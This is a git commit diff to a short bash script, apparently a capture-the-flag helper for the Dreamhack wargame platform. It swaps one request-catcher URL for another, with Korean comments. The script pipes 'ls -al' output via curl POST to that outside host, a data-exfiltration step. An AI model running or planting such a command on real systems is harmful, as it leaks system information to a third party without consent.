42e029f875b6cfb1bc1e6e629593e4536ee4d08a
Dohyun Park <dhlife09@gmail.com>
2026-07-14 01:36:38 +0900

    Update TARGET_URL for data transmission

--- 2.sh
+++ 2.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # 1. 설정 (수신 서버 정보)
-TARGET_URL="https://ifkpgnp.request.dreamhack.games"
+TARGET_URL="https://wwmyrzl.request.dreamhack.games"
 
 # 2. ls -al 결과 전송 (원본 그대로 전송)
 ls -al | curl -X POST --data-binary @- "${TARGET_URL}"
